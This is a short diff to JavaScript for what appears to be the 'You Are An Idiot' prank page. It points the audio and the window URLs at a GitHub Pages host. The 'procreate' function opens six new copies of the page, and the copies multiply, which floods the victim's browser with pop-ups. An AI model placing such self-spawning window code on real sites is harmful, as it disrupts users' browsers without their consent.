@@ -1,4 +1,4 @@
-var audio = new Audio('youare.mp3');
+var audio = new Audio('https://yaaio.github.io/thing/youare.mp3');
 audio.loop = false;
 audio.play(); 
 var xOff = 5;
@@ -12,12 +12,12 @@ function openWindow(url){
 }
 
 function procreate(){
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
-		openWindow('https://raw.githubusercontent.com/SuperS0n1k/yaaio/master/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
+		openWindow('https://yaaio.github.io/thing/thing.html');
 		}
 
 function newXlt(){
